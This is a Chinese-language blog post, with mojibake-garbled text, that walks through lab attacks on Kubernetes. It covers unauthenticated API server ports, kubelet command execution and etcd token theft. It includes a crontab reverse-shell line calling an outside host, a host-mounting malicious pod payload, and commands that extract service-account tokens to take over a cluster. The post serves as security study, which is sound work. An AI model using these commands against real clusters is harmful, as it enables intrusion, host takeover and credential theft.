<!DOCTYPE html><html lang="zh-CN"><head><meta http-equiv="content-type" content="text/html; charset=utf-8"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black-translucent" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="description" content=""><title>äº‘æ”»é˜²-K8Så®‰å…¨ | Hao's Blog</title><link rel="stylesheet" type="text/css" href="/css/style.css?v=undefined"><link rel="stylesheet" type="text/css" href="https://unpkg.com/normalize.css"><link rel="stylesheet" type="text/css" href="https://unpkg.com/purecss/build/pure-min.css"><link rel="stylesheet" type="text/css" href="https://unpkg.com/purecss/build/grids-responsive-min.css"><link rel="stylesheet" href="https://unpkg.com/font-awesome@4.7.0/css/font-awesome.min.css"><script type="text/javascript" src="https://unpkg.com/jquery/dist/jquery.min.js"></script><link rel="icon" mask="" sizes="any" href="/favicon.ico"><link rel="Shortcut Icon" type="image/x-icon" href="/favicon.ico"><link rel="apple-touch-icon" href="/apple-touch-icon.png"><link rel="apple-touch-icon-precomposed" href="/apple-touch-icon.png"><script type="text/javascript" src="https://unpkg.com/clipboard/dist/clipboard.min.js"></script><script type="text/javascript" src="https://unpkg.com/toastr/build/toastr.min.js"></script><link rel="stylesheet" href="https://unpkg.com/toastr/build/toastr.min.css"><div class="darkmode-toggle">ğŸŒ“</div><script>var prefersDarkMode = window.matchMedia('(prefers-color-scheme: dark)');
var toggle = document.querySelector('.darkmode-toggle');
var html = document.querySelector('html');

html.dataset.dark = localStorage.dark || prefersDarkMode.matches;

toggle.addEventListener('click', () => {
localStorage.dark = !(html.dataset.dark == 'true');
html.dataset.dark = localStorage.dark;
});</script><meta name="generator" content="Hexo 7.3.0"></head><body><div class="body_container"><div id="header"><div class="site-name"><h1 class="hidden">äº‘æ”»é˜²-K8Så®‰å…¨</h1><a id="logo" href="/.">Hao's Blog</a><p class="description"></p></div><div id="nav-menu"><a class="current" href="/."><i class="fa fa-home"> é¦–é¡µ</i></a><a href="/archives/"><i class="fa fa-archive"> å½’æ¡£</i></a><a href="/about/"><i class="fa fa-user"> å…³äº</i></a></div></div><div class="pure-g" id="layout"><div class="pure-u-1 pure-u-md-3-4"><div class="content_container"><div class="post"><h1 class="post-title">äº‘æ”»é˜²-K8Så®‰å…¨</h1><div class="post-meta">2025-06-17<span> | </span><span class="category"><a href="/categories/%E4%BA%91%E5%AE%89%E5%85%A8/">äº‘å®‰å…¨</a></span></div><div class="clear"><div class="toc-article" id="toc"><div class="toc-title">æ–‡ç« ç›®å½•</div><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BA%91%E6%94%BB%E9%98%B2-K8S%E5%AE%89%E5%85%A8"><span class="toc-number">1.</span> <span class="toc-text">äº‘æ”»é˜²-K8Så®‰å…¨</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#K8S-%E9%9B%86%E7%BE%A4%E6%94%BB%E5%87%BB%E7%82%B9"><span class="toc-number">1.1.</span> <span class="toc-text">K8S é›†ç¾¤æ”»å‡»ç‚¹</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%EF%BC%8Capi-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE"><span class="toc-number">1.2.</span> <span class="toc-text">ä¸€ï¼Œapi æœªæˆæƒè®¿é—®</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1%EF%BC%8C-%E6%94%BB%E5%87%BB-8080-%E7%AB%AF%E5%8F%A3"><span class="toc-number">1.2.1.</span> <span class="toc-text">1ï¼Œ æ”»å‡» 8080 ç«¯å£</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2%E3%80%81%E6%94%BB%E5%87%BB-6443-%E7%AB%AF%E5%8F%A3"><span class="toc-number">1.2.2.</span> <span class="toc-text">2ã€æ”»å‡» 6443 ç«¯å£</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3%EF%BC%8C%E6%94%BB%E5%87%BB-10250-%E7%AB%AF%E5%8F%A3%EF%BC%9Akubelet-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE"><span class="toc-number">1.2.3.</span> <span class="toc-text">3ï¼Œæ”»å‡» 10250 ç«¯å£ï¼škubelet æœªæˆæƒè®¿é—®</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%EF%BC%8Cetcd-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%EF%BC%88%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6%E8%8B%9B%E5%88%BB%EF%BC%89"><span class="toc-number">1.3.</span> <span class="toc-text">äºŒï¼Œetcd æœªæˆæƒè®¿é—®ï¼ˆåˆ©ç”¨æ¡ä»¶è‹›åˆ»ï¼‰</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%89%EF%BC%8CDashboard-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE"><span class="toc-number">1.4.</span> <span class="toc-text">ä¸‰ï¼ŒDashboard æœªæˆæƒè®¿é—®</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%94%EF%BC%8CConfigfile-%E9%89%B4%E6%9D%83%E6%96%87%E4%BB%B6%E6%B3%84%E6%BC%8F"><span class="toc-number">1.5.</span> <span class="toc-text">äº”ï¼ŒConfigfile é‰´æƒæ–‡ä»¶æ³„æ¼</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%AD%EF%BC%8CKubectl-Proxy-%E4%B8%8D%E5%AE%89%E5%85%A8%E9%85%8D%E7%BD%AE"><span class="toc-number">1.6.</span> <span class="toc-text">å…­ï¼ŒKubectl Proxy ä¸å®‰å…¨é…ç½®</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%83%EF%BC%8CK8S-%E7%9A%84%E6%B1%A1%E7%82%B9%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8"><span class="toc-number">1.7.</span> <span class="toc-text">ä¸ƒï¼ŒK8S çš„æ±¡ç‚¹æ¨ªå‘ç§»åŠ¨</span></a></li></ol></li></ol></div></div><div class="post-content"><h1 id="äº‘æ”»é˜²-K8Så®‰å…¨"><a href="#äº‘æ”»é˜²-K8Så®‰å…¨" class="headerlink" title="äº‘æ”»é˜²-K8Så®‰å…¨"></a>äº‘æ”»é˜²-K8Så®‰å…¨</h1><p>Kubernetes æ˜¯ä¸€ä¸ªå¼€æºçš„ï¼Œç”¨äºç¼–æ’äº‘å¹³å°ä¸­å¤šä¸ªä¸»æœºä¸Šçš„å®¹å™¨åŒ–çš„åº”ç”¨ï¼Œç›®æ ‡æ˜¯è®©<br>éƒ¨ç½²å®¹å™¨åŒ–çš„åº”ç”¨èƒ½ç®€å•å¹¶ä¸”é«˜æ•ˆçš„ä½¿ç”¨ï¼Œæä¾›äº†åº”ç”¨éƒ¨ç½²ï¼Œè§„åˆ’ï¼Œæ›´æ–°ï¼Œç»´æŠ¤çš„ä¸€ç§æœº<br>åˆ¶ã€‚å…¶æ ¸å¿ƒçš„ç‰¹ç‚¹å°±æ˜¯èƒ½å¤Ÿè‡ªä¸»çš„ç®¡ç†å®¹å™¨æ¥ä¿è¯äº‘å¹³å°ä¸­çš„å®¹å™¨æŒ‰ç…§ç”¨æˆ·çš„æœŸæœ›çŠ¶æ€è¿<br>è¡Œç€ï¼Œç®¡ç†å‘˜å¯ä»¥åŠ è½½ä¸€ä¸ªå¾®å‹æœåŠ¡ï¼Œè®©è§„åˆ’å™¨æ¥æ‰¾åˆ°åˆé€‚çš„ä½ç½®ï¼ŒåŒæ—¶ï¼ŒKubernetes<br>åœ¨ç³»ç»Ÿæå‡å·¥å…·ä»¥åŠäººæ€§åŒ–æ–¹é¢ï¼Œè®©ç”¨æˆ·èƒ½å¤Ÿæ–¹ä¾¿çš„éƒ¨ç½²è‡ªå·±çš„åº”ç”¨ã€‚</p>
<p>å‚è€ƒï¼š</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_34101364/article/details/122506768">https://blog.csdn.net/qq_34101364/article/details/122506768</a></p>
<p><img src="https://myhaoblog.oss-cn-beijing.aliyuncs.com/blog%20%E5%9B%BE%E7%89%87/image-2.png"></p>
<p><img src="https://myhaoblog.oss-cn-beijing.aliyuncs.com/blog%20%E5%9B%BE%E7%89%87/image.png"></p>
<p><img src="https://myhaoblog.oss-cn-beijing.aliyuncs.com/blog%20%E5%9B%BE%E7%89%87/image-1.png"></p>
<h2 id="K8S-é›†ç¾¤æ”»å‡»ç‚¹"><a href="#K8S-é›†ç¾¤æ”»å‡»ç‚¹" class="headerlink" title="K8S é›†ç¾¤æ”»å‡»ç‚¹"></a>K8S é›†ç¾¤æ”»å‡»ç‚¹</h2><p>éšç€è¶Šæ¥è¶Šå¤šä¼ä¸šå¼€å§‹ä¸Šäº‘çš„æ­¥ä¼ï¼Œåœ¨æ”»é˜²æ¼”ç»ƒä¸­å¸¸å¸¸ç¢°åˆ°äº‘ç›¸å…³çš„åœºæ™¯ï¼Œä¾‹ï¼šå…¬æœ‰äº‘ã€</p>
<p>ç§æœ‰äº‘ã€æ··åˆäº‘ã€è™šæ‹ŸåŒ–é›†ç¾¤ç­‰ã€‚ä»¥å¾€æ¸—é€è·¯å¾„ã€Œå¤–ç½‘çªç ´ -&gt; ææƒ -&gt; æƒé™ç»´æŒ -&gt; ä¿¡æ¯æ”¶</p>
<p>é›† -&gt; æ¨ªå‘ç§»åŠ¨ -&gt; å¾ªç¯æ”¶é›†ä¿¡æ¯ã€ï¼Œç›´åˆ°è·å¾—é‡è¦ç›®æ ‡ç³»ç»Ÿã€‚ä½†éšç€ä¸šåŠ¡ä¸Šäº‘ä»¥åŠè™šæ‹ŸåŒ–æŠ€</p>
<p>æœ¯çš„å¼•å…¥æ”¹å˜äº†è¿™ç§æ ¼å±€ï¼Œä¹Ÿæ‰“å¼€äº†æ–°çš„å…¥ä¾µè·¯å¾„ï¼Œä¾‹å¦‚ï¼š</p>
<ul>
<li><p>1ã€é€šè¿‡è™šæ‹Ÿæœºæ”»å‡»äº‘ç®¡ç†å¹³å°ï¼Œåˆ©ç”¨ç®¡ç†å¹³å°æ§åˆ¶æ‰€æœ‰æœºå™¨</p>
</li>
<li><p>2ã€é€šè¿‡å®¹å™¨è¿›è¡Œé€ƒé€¸ï¼Œä»è€Œæ§åˆ¶å®¿ä¸»æœºä»¥åŠæ¨ªå‘æ¸—é€åˆ° K8s Master èŠ‚ç‚¹æ§åˆ¶æ‰€æœ‰å®¹å™¨</p>
</li>
<li><p>3ã€åˆ©ç”¨ KVM-QEMU &#x2F; æ‰§è¡Œé€ƒé€¸è·å–å®¿ä¸»æœºï¼Œè¿›å…¥ç‰©ç†ç½‘ç»œæ¨ªå‘ç§»åŠ¨æ§åˆ¶äº‘å¹³å°</p>
</li>
</ul>
<p>ç›®å‰äº’è”ç½‘ä¸Šé’ˆå¯¹äº‘åŸç”Ÿåœºæ™¯ä¸‹çš„æ”»å‡»æ‰‹æ³•é›¶é›¶æ•£æ•£çš„è¾ƒå¤šï¼Œä»…æœ‰ä¸€äº›å‚å•†å‘å¸ƒè¿‡ç›¸å…³çŸ©</p>
<p>é˜µæŠ€æœ¯ï¼Œä½†æ²¡æœ‰è¿‡å¤šçš„ç»†èŠ‚å±•ç¤ºï¼Œæœ¬æ–‡åŸºäºå¾®è½¯å‘å¸ƒçš„ Kubernetes å¨èƒçŸ©é˜µè¿›è¡Œæ‰©å±•ï¼Œä»‹ç»ç›¸å…³çš„å…·ä½“æ”»å‡»æ–¹æ³•ã€‚</p>
<p>å‚è€ƒï¼š</p>
<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/yQoqozJgP8F-ad24xgzIPw">https://mp.weixin.qq.com/s/yQoqozJgP8F-ad24xgzIPw</a></p>
<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/QEuQa0KVwykrMzOPdgEHMQ">https://mp.weixin.qq.com/s/QEuQa0KVwykrMzOPdgEHMQ</a></p>
<p>cat &#x2F;proc&#x2F;1&#x2F;cgroup &#x2F;&#x2F; æŸ¥çœ‹æ˜¯å¦å­˜åœ¨ K8S</p>
<h2 id="ä¸€ï¼Œapi-æœªæˆæƒè®¿é—®"><a href="#ä¸€ï¼Œapi-æœªæˆæƒè®¿é—®" class="headerlink" title="ä¸€ï¼Œapi æœªæˆæƒè®¿é—®"></a>ä¸€ï¼Œapi æœªæˆæƒè®¿é—®</h2><h3 id="1ï¼Œ-æ”»å‡»-8080-ç«¯å£"><a href="#1ï¼Œ-æ”»å‡»-8080-ç«¯å£" class="headerlink" title="1ï¼Œ æ”»å‡» 8080 ç«¯å£"></a>1ï¼Œ æ”»å‡» 8080 ç«¯å£</h3><p>API Server æœªæˆæƒè®¿é—®æ—§ç‰ˆæœ¬çš„ k8s çš„ API Server é»˜è®¤ä¼šå¼€å¯ä¸¤ä¸ªç«¯å£ï¼š8080 å’Œ 6443ã€‚6443 æ˜¯å®‰å…¨ç«¯å£ï¼Œå®‰å…¨ç«¯å£ä½¿ç”¨ TLS åŠ å¯†ï¼›ä½†æ˜¯ 8080 ç«¯å£æ— éœ€è®¤è¯ï¼Œä»…ç”¨äºæµ‹è¯•ã€‚6443 ç«¯å£éœ€è¦è®¤è¯ï¼Œä¸”æœ‰ TLS ä¿æŠ¤ã€‚(k8s&lt;1.16.0) æ–°ç‰ˆæœ¬ k8s é»˜è®¤å·²ç»ä¸å¼€å¯ 8080ã€‚éœ€è¦æ›´æ”¹ç›¸åº”çš„é…ç½®</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd /etc/kubernetes/manifests/</span><br><span class="line">--insecure-port=8080</span><br><span class="line">--insecure-bind-address=0.0.0.0</span><br></pre></td></tr></table></figure>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">kubectl.exe -s 192.168.139.130:8080 get nodes</span><br><span class="line">kubectl.exe -s 192.168.139.130:8080 get pods</span><br><span class="line">//è¿æ¥ååˆ›å»ºtest.yamlæ–‡ä»¶</span><br><span class="line">kubectl -s 192.168.139.130:8080 create -f test.yaml</span><br><span class="line">//åŒè¿‡api server åˆ›å»ºtest.yamlæ–‡ä»¶æ¥åˆ›å»ºä¸€ä¸ªæ–°çš„pod</span><br><span class="line">kubectl -s 192.168.139.130:8080--namespace=default exec -it test </span><br><span class="line">bash </span><br><span class="line">echo -e &quot;***** root bash -i &gt;&amp; /dev/tcp/192.168.139.128/4444 0&gt;&amp;1\n&quot; &gt;&gt; /mnt/etc/crontab</span><br><span class="line">//å†™å…¥å®šæ—¶ä»»åŠ¡ï¼Œæ‰§è¡Œåå¼¹shell</span><br></pre></td></tr></table></figure>
<p>test.yaml ä¸­çš„å†…å®¹</p>
<p><img src="https://myhaoblog.oss-cn-beijing.aliyuncs.com/blog%20%E5%9B%BE%E7%89%87/image-5.png"></p>
<h3 id="2ã€æ”»å‡»-6443-ç«¯å£"><a href="#2ã€æ”»å‡»-6443-ç«¯å£" class="headerlink" title="2ã€æ”»å‡» 6443 ç«¯å£"></a>2ã€æ”»å‡» 6443 ç«¯å£</h3><p>API Server æœªæˆæƒè®¿é—®ä¸€äº›é›†ç¾¤ç”±äºé‰´æƒé…ç½®ä¸å½“ï¼Œå°†â€system:anonymousâ€ ç”¨æˆ·ç»‘å®šåˆ°â€cluster-adminâ€ ç”¨æˆ·ç»„ï¼Œä»è€Œä½¿ 6443 ç«¯å£å…è®¸åŒ¿åç”¨æˆ·ä»¥ç®¡ç†å‘˜æƒé™å‘é›†ç¾¤å†…éƒ¨ä¸‹å‘æŒ‡ä»¤ã€‚</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kubectl create clusterrolebinding system:anonymous</span><br><span class="line">--clusterrole=cluster-admin            --user=system:anonymous</span><br></pre></td></tr></table></figure>
<p>æ”»å‡»æ—¶è®¿é—® 6443 ç«¯å£ï¼Œå­˜åœ¨æ­¤æƒ…å†µé‚£ä¹ˆå¯ä»¥å°è¯•æ”»å‡»</p>
<p><img src="https://myhaoblog.oss-cn-beijing.aliyuncs.com/blog%20%E5%9B%BE%E7%89%87/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE-2025-05-12-205753.png"></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">-åˆ›å»ºæ¶æ„ pods</span><br><span class="line">https://192.168.139.130:6443/api/v1/namespaces/default/pods/</span><br><span class="line">//æ„å»ºæ•°æ®åŒ…POST</span><br><span class="line">&#123;&quot;apiVersion&quot; : &quot;v1&quot; ,&quot;kind&quot; : &quot;Pod&quot; , &quot;metadata&quot;: &#123;&quot;annotations&quot; : &#123;&quot;kubect.kubernetes.io/last-applied-configuration&quot; :&quot;&#123;\&quot;apiVersion\&quot;:\&quot;v1\,\&quot;kind\&quot; : \&quot;Pod\&quot; ,\&quot;metadata\&quot;: &#123;\&quot;annotations\&quot;: &#123;&#125; ,\&quot;name\&quot;:\&quot;tes02\&quot; ,\&quot;namespace\&quot;:\&quot;default\&quot;&#125;,\&quot;spec\&quot;: &#123;\&quot;containers\&quot; :[&#123;\&quot;image\&quot; : \&quot;nginx:1.14.2\&quot;,\&quot;name\&quot;:\&quot;test02\&quot;,\&quot;volumeMounts\&quot; :[&#123;\&quot;mountPath\&quot;:\&quot;/host\&quot;,\&quot;name\&quot;:\&quot;host\&quot;&#125;]&#125;],\&quot;volumes\&quot;:[&#123;\&quot;hostPath\&quot;:&#123;\&quot;path\&quot; :\&quot;/\&quot; ,\&quot;type\&quot;:\&quot;Directory\&quot;&#125; ,\&quot;name\&quot;:\&quot;host\&quot; &#125;]&#125; &#125;\n&quot;&#125;&quot;name&quot; : &quot;test02&quot; ,&quot;namespace&quot; :&quot;default&quot;&#125;,&quot;spec&quot; : &#123;&quot;containers&quot; :[&#123;&quot;image&quot;:&quot;nginx:1.14.2&quot;,&quot;name&quot;:&quot;test02&quot;,&quot;volumeMounts&quot; :[&#123;&quot;mountPath&quot;:&quot;/host&quot; ,&quot;name&quot; :&quot;host&quot; &#125; ]&#125;],&quot;volumes&quot; : [ &#123;&quot;hostPath&quot; : &#123;&quot;path&quot; :&quot;/&quot; ,&quot;type&quot;&quot;Directory&quot;&#125;,&quot;name&quot;:&quot;host&quot;&#125;]&#125; &#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">-è¿æ¥åˆ¤æ–­pods</span><br><span class="line">kubectl --insecure-skip-tls-verify -s https://192.168.139.130:6443 get pods</span><br><span class="line">-è¿æ¥æ‰§è¡Œpods</span><br><span class="line">kubectl --insecure-skip-tls-verify -s https://192.168.139.130:6443 --namespace=default exec -it test02 bash</span><br></pre></td></tr></table></figure>
<p>æ“ä½œä¸ä¸Šé¢ä¸€æ ·ï¼Œå†™å…¥åå¼¹ shell</p>
<h3 id="3ï¼Œæ”»å‡»-10250-ç«¯å£ï¼škubelet-æœªæˆæƒè®¿é—®"><a href="#3ï¼Œæ”»å‡»-10250-ç«¯å£ï¼škubelet-æœªæˆæƒè®¿é—®" class="headerlink" title="3ï¼Œæ”»å‡» 10250 ç«¯å£ï¼škubelet æœªæˆæƒè®¿é—®"></a>3ï¼Œæ”»å‡» 10250 ç«¯å£ï¼škubelet æœªæˆæƒè®¿é—®</h3><p>ä¸ API Server ç±»ä¼¼ï¼ŒKubelet ä¹Ÿè¿è¡Œç€ API æœåŠ¡ï¼Œé»˜è®¤æœåŠ¡ç«¯å£ä¸º 10250 å’Œ 10248</p>
<p>Kubelet å­˜åœ¨çš„é£é™©ä¸»è¦ä¹Ÿæ˜¯æœªæˆæƒè®¿é—®ï¼Œå¦‚æœ Kubelet å­˜åœ¨æœªæˆæƒè®¿é—®ï¼Œå°±å¯ä»¥æ§åˆ¶æ‰€åœ¨èŠ‚ç‚¹çš„æƒé™ã€‚</p>
<p>æ¡ä»¶ï¼š</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/var/lib/kubelet/config.yaml</span><br><span class="line">ä¿®æ”¹ authenticationçš„anonyousä¸ºtrue  </span><br><span class="line">å°†authorization mode ä¿®æ”¹ä¸º AlwaysAllow</span><br></pre></td></tr></table></figure>
<p><img src="https://myhaoblog.oss-cn-beijing.aliyuncs.com/blog%20%E5%9B%BE%E7%89%87/image-6.png"><br>è®¿é—®é¡µé¢æ—¶ï¼Œå­˜åœ¨æ­¤æ•°æ®ä»£è¡¨å­˜åœ¨æ¼æ´<br><img src="https://myhaoblog.oss-cn-beijing.aliyuncs.com/blog%20%E5%9B%BE%E7%89%87/image-7-1024x432.png"><br>åˆ©ç”¨æ‰§è¡Œå‘½ä»¤ï¼Œéœ€è¦åˆ©ç”¨ä¸‰ä¸ªå‚æ•°ï¼š</p>
<p>namespaceï¼Œpodï¼Œcontainer</p>
<p>è®¿é—® <a target="_blank" rel="noopener" href="https://192.168.139.132:10250/runningpods">https://192.168.139.132:10250/runningpods</a></p>
<p>ä½¿ç”¨è°·æ­Œ FeHelper æ’ä»¶å¯ä»¥å°† json æ•°æ®æ›´åŠ ç›´è§‚çš„çœ‹åˆ°</p>
<p><img src="https://myhaoblog.oss-cn-beijing.aliyuncs.com/blog%20%E5%9B%BE%E7%89%87/image-8.png"><br>æ‰§è¡Œæ¨¡æ¿ï¼š</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -X POST -k &quot;https://192.168.139.132:10250/run/&lt;namespace&gt;/&lt;pod&gt;/&lt;container&gt;&quot; -d &quot;cmd=id&quot;</span><br></pre></td></tr></table></figure>
<p>æ„é€ è§¦å‘ï¼š</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://192.168.139.132:10250/run/default/test02/test02</span><br><span class="line">curl -X POST -k &quot;https://192.168.139.132:10250/run/default/test02/test02&quot; -d &quot;cmd=id&quot;</span><br></pre></td></tr></table></figure>
<h2 id="äºŒï¼Œetcd-æœªæˆæƒè®¿é—®ï¼ˆåˆ©ç”¨æ¡ä»¶è‹›åˆ»ï¼‰"><a href="#äºŒï¼Œetcd-æœªæˆæƒè®¿é—®ï¼ˆåˆ©ç”¨æ¡ä»¶è‹›åˆ»ï¼‰" class="headerlink" title="äºŒï¼Œetcd æœªæˆæƒè®¿é—®ï¼ˆåˆ©ç”¨æ¡ä»¶è‹›åˆ»ï¼‰"></a>äºŒï¼Œetcd æœªæˆæƒè®¿é—®ï¼ˆåˆ©ç”¨æ¡ä»¶è‹›åˆ»ï¼‰</h2><p>é»˜è®¤é€šè¿‡è¯ä¹¦è®¤è¯ï¼Œä¸»è¦å­˜æ”¾èŠ‚ç‚¹çš„æ•°æ®ï¼Œå¦‚ä¸€äº› token å’Œè¯ä¹¦ã€‚</p>
<p><strong>ç¬¬ä¸€ç§</strong>ï¼šæ²¡æœ‰é…ç½®æŒ‡å®šâ€“client-cert-auth å‚æ•°æ‰“å¼€è¯ä¹¦æ ¡éªŒï¼Œæš´éœ²åœ¨å¤– etcd æœåŠ¡å­˜åœ¨æœªæˆæƒè®¿é—®é£é™©ã€‚</p>
<ul>
<li>æš´éœ²å¤–éƒ¨å¯ä»¥è®¿é—®ï¼Œç›´æ¥æœªæˆæƒè®¿é—®è·å– secrets å’Œ token åˆ©ç”¨</li>
</ul>
<p><strong>ç¬¬äºŒç§</strong>: åœ¨æ‰“å¼€è¯ä¹¦æ ¡éªŒé€‰é¡¹åï¼Œé€šè¿‡æœ¬åœ° 127.0.0.1:2379 å¯å…è®¤è¯è®¿é—® Etcd æœåŠ¡ï¼Œä½†é€šè¿‡å…¶ä»–åœ°å€è®¿é—®è¦æºå¸¦ cert è¿›è¡Œè®¤è¯è®¿é—®ï¼Œä¸€èˆ¬é…åˆ ssrf æˆ–å…¶ä»–åˆ©ç”¨ï¼Œè¾ƒä¸ºé¸¡è‚‹ã€‚</p>
<ul>
<li>åªèƒ½æœ¬åœ°è®¿é—®ï¼Œç›´æ¥æœªæˆæƒè®¿é—®è·å– secrets å’Œ token åˆ©ç”¨</li>
</ul>
<p><strong>ç¬¬ä¸‰ç§</strong>: å®æˆ˜ä¸­åœ¨å®‰è£… k8s é»˜è®¤çš„é…ç½® 2379 åªä¼šç›‘å¬æœ¬åœ°ï¼Œå¦‚æœè®¿é—®æ²¡è®¾ç½® 0.0.0.0 æš´éœ²ï¼Œé‚£ä¹ˆä¹Ÿå°±æ„å‘³ç€æœ€å¤šå°±æ˜¯æœ¬åœ°è®¿é—®ï¼Œä¸èƒ½å…¬ç½‘è®¿é—®ï¼Œåªèƒ½é…åˆ ssrf æˆ–å…¶ä»–ã€‚</p>
<ul>
<li>åªèƒ½æœ¬åœ°è®¿é—®ï¼Œåˆ©ç”¨ ssrf æˆ–å…¶ä»–è¿›è¡Œè·å– secrets å’Œ token åˆ©ç”¨</li>
</ul>
<p>å¤ç°åˆ©ç”¨:<br>æš´éœ² etcd æœªæˆæƒ -&gt; è·å– secrets&amp;token-&gt; é€šè¿‡ token è®¿é—® API-Server æ¥ç®¡</p>
<p>SSRF è§£å†³é™åˆ¶è®¿é—® -&gt; è·å– secrets&amp;token-&gt; é€šè¿‡ token è®¿é—® API-Server æ¥ç®¡</p>
<p>V2&#x2F;v3 ç‰ˆæœ¬åˆ©ç”¨å‚è€ƒ:<a target="_blank" rel="noopener" href="https://www.cnblogs.com/qtzd/p/k8s">https://www.cnblogs.com/qtzd/p/k8s</a> etcd.html</p>
<p>å¯åŠ¨:kubectl createf recommended.yaml</p>
<p>V2 ç‰ˆæœ¬åˆ©ç”¨:</p>
<p>ç›´æ¥è®¿é—´ <a target="_blank" rel="noopener" href="http://ip:2379/v2/keys/?recursive=true%EF%BC%8C%E5%8F%AF%E4%BB%A5%E7%9C%8B%E5%88%B0%E6%89%80%E6%9C%89%E7%9A%84">http://ip:2379/v2/keys/?recursive=trueï¼Œå¯ä»¥çœ‹åˆ°æ‰€æœ‰çš„</a> key-value å€¼ã€‚(secrets token)</p>
<p>V3 ç‰ˆæœ¬åˆ©ç”¨ï¼š</p>
<p>1ã€è¿æ¥æäº¤æµ‹è¯•</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">./etcdctl --endpoints=192.168.139.136:23791 get / --prefix</span><br><span class="line">./etcdctl --endpoints=192.168.139.136:23791 put /testdir/testkey1&quot;Hello world1&quot;</span><br><span class="line">./etcdctl --endpoints=192.168139.136:23791 put /testdir/testkey2&quot;Hello world2&quot;</span><br><span class="line">./etcdctl --endpoints=192.168.139.136:23791 put /testdir/testkey3&quot;Hello world3&quot;</span><br></pre></td></tr></table></figure>
<p>2ã€è·å– k8s çš„ secrets:</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./etcdctl --endpoints=192.168.139.136:23791 get / --prefix--keys-only | grep /secrets/</span><br></pre></td></tr></table></figure>
<p>3ã€è¯»å– service account token:.</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./etcdctl --endpoints=192.168.139.136:23791 get /--prefix --keys-only | grep /secrets/kube-system/clusterrole</span><br><span class="line">./etcdctl--endpoints-192.168.139.136:23791 get /registry/secrets/kube-system/clusterrole-aggregation-controller-token-jdp5z</span><br></pre></td></tr></table></figure>
<p>4ã€é€šè¿‡ token è®¿é—® API-Serverï¼Œè·å–é›†ç¾¤çš„æƒé™:</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl --insecure-skip-tls-verify-s https://127.0.0.1:6443/ -token=&quot;ey...&quot; -n kube-system get pods</span><br></pre></td></tr></table></figure>
